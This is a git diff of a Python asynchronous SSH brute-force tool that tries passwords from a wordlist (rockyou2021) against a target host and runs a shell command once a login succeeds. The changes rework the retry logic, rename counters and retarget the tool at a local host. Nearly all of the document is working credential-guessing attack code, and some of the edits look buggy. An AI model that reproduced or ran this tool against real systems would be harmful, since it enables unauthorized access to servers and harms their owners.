@@ -14,13 +14,10 @@ Port: int = -1
 reset: str = "\033[m"
 start: float = 0
 
-clone: dict[str, int] = {}
 
 def goodbye():
     if not os.path.exists('debug'):
         os.makedirs('debug')
-    with open("debug/statistic.txt", "w") as f:
-        pprint(clone, f)
     elapsed = time.perf_counter() - start
     if Password != '':
         s = f"""
@@ -83,7 +80,7 @@ class BruteForceSSH:
         self.start: float = time.perf_counter()
         
         # auxiliary variables to keep track of requests (made / not made)
-        self.not_checked: int = 0
+        self.failed: int = 0
         self.checked: int = 0
         self.tot_password: int = 0
         
@@ -92,12 +89,12 @@ class BruteForceSSH:
         
     def print_stdout(self, *args): 
         if self.verbose:
-            print(f"\33[1;31;46mpassword read from file: {args[0]}    Still Remain: {self.tot_password - self.checked}    Checked: {self.checked}    Failed: {self.not_checked} Elapsed: {time.strftime('%Hh %Mm %Ss', time.gmtime(time.perf_counter() - self.start))}", reset)
+            print(f"\33[1;31;46mpassword read from file: {args[0]}    Still Remain: {self.tot_password - self.checked}    Checked: {self.checked}    Failed: {self.failed} Elapsed: {time.strftime('%Hh %Mm %Ss', time.gmtime(time.perf_counter() - self.start))}", reset)
             print(*args[1:], reset)
         elif self.quiet:
             print(f"\33[1;31;46m Processed: {self.checked} on {args[0]}", reset)
         else:
-            print(f"\33[1;31;46mpassword read from file: {args[0]}    Still Remain: {self.tot_password - self.checked}    Checked: {self.checked}    Failed: {self.not_checked}", reset)
+            print(f"\33[1;31;46mpassword read from file: {args[0]}    Still Remain: {self.tot_password - self.checked}    Checked: {self.checked}    Failed: {self.failed}", reset)
     
     def run(self):
         atexit.register(goodbye)
@@ -122,7 +119,7 @@ class BruteForceSSH:
     # ================================ Async Functions ================================ #
         
     # ------------------------------ Perform SSH request to find out Password ------------------------------ #
-    async def brute(self, password: str, nostop: bool = False ,command: str = '\nls -la ; echo "\nHello from ur new hacking station :)\n"'):
+    async def brute(self, password: str, nostop: bool = False, command: str = '\nls -la ; echo "\nHello from ur new hacking station :)\n"'):
         i = 0
         while nostop or i <= self.max_retries:
             await asyncio.sleep(random() * self.asleep)
@@ -143,18 +140,18 @@ class BruteForceSSH:
                 except KeyError as k:
                     pass
                 self.checked += 1
+                self.failed -= 1
                 return
             except asyncssh.ConnectionLost as e:
                 self.print_stdout(self.tot_password, f"\33[1;30;1mattempt nr {i}", "\33[1;34;1m[Connection Refused]\t", f"\33[1;37;1mUsername: {self.user}, Password: {password}\t", f"\33[1;31;1m{e} --> {e.__class__}")
                 if i == 0:
                     self.lost_attempt.add(password)
-                    self.not_checked += 1
+                    self.failed += 1
             except Exception as e:
                 self.print_stdout(self.tot_password, f"\33[1;30;1mattempt nr {i}", "\33[1;35;1m[Connection Reset]\t", f"\33[1;37;1mUsername: {self.user}, Password: {password}\t", f"\33[1;31;1m{e} --> {e.__class__}")
                 if i == 0:
                     self.lost_attempt.add(password)
-                    self.not_checked += 1
-            clone[password] = clone.get(password, 0) + 1
+                    self.failed += 1
             i += 1
         return 
 
@@ -170,16 +167,21 @@ class BruteForceSSH:
         index: int = self.file.rfind(".", lenght // 2, lenght)
         file_ext: str = self.file[index:]
         async with aiofiles.open(self.file, mode="r", encoding="utf-8", newline="") as f:
-            if (file_ext == '.csv'):
-                async for row in aiocsv.AsyncReader(f):
-                    yield row[1], i
-                    self.tot_password = i
-                    i += 1
-            else:
-                async for row in aiocsv.AsyncReader(f):
-                    yield row[0], i
-                    self.tot_password = i
-                    i += 1
+            async for row in aiocsv.AsyncReader(f):
+                if len(self.lost_attempt) > 20000:
+                    copy_set = self.lost_attempt.copy()
+                    pop_set = 0
+                    while pop_set < 7000:
+                        print("Yelded from set hope it will decrease memory !!!", reset)
+                        yield copy_set.pop(), i + pop_set
+                        pop_set += 1
+                    del copy_set
+                elif (file_ext == '.csv'):
+                    yield repr(row[1])[1:-1], i
+                else:
+                    yield repr(row[0])[1:-1], i
+                self.tot_password = i
+                i += 1
 
     # ------------------------------ Test all passwords in a file ------------------------------ #
     async def main(self):
@@ -190,12 +192,14 @@ class BruteForceSSH:
                     asyncio.create_task(self.brute_with_sem(passw, sem)) 
                     async for passw, _ in self.read_file()
                 ]
-            await asyncio.gather(*tasks, return_exceptions=True)
+            # await asyncio.gather(*tasks, return_exceptions=True)
         else:
             tasks = []
             add = tasks.append
             async for passw, i in self.read_file():
-                if i % self.sem == 1:
+                # Riga cambiata per test Rockyou2021
+                if i % 10000 == 1:
+                # if i % self.sem == 1:
                     [await task for task in tasks]
                     tasks = [asyncio.ensure_future(self.brute_with_sem(passw, sem))]
                 if self.mode == 2:
@@ -207,7 +211,7 @@ class BruteForceSSH:
         # perform the unsent remaining requests 
         while (len(self.lost_attempt) > 0):
             copy_set: set = self.lost_attempt.copy()
-            self.not_checked = 0
+            self.failed = 0
             tasks: list = [
                     asyncio.create_task(self.brute_with_sem(passw, sem)) 
                     for passw in copy_set
@@ -242,7 +246,7 @@ class BruteForceSSH:
             # perform the unsent remaining requests 
             while (len(self.lost_attempt) > 0):
                 copy_set: set = self.lost_attempt.copy()
-                self.not_checked = 0
+                self.failed = 0
                 tasks: list = [
                         loop.run_in_executor(pool, self.run_thread_pool, passw)
                         for passw in copy_set
@@ -257,15 +261,17 @@ if __name__ == '__main__':
     start: float = time.perf_counter()
 
     b = BruteForceSSH(
-        user='kepap',
-        host='192.168.0.197',
-        port=22,
-        file='passwords.csv',
-        mode=2,
-        sem=95,
-        max_workers=1000,
-        max_retries=3,
-        asleep=0
+        user='fede',
+        host='192.168.0.212',
+        port=4242,
+        file='/Users/federikowsky/Desktop/.mylib/wordlist/rockyou2021.txt',
+        mode=1,
+        sem=300,
+        max_workers=0,
+        max_retries=1,
+        asleep=0,
+        verbose=True,
+        quiet=False
     )
     res = asyncio.run(b.run())
     
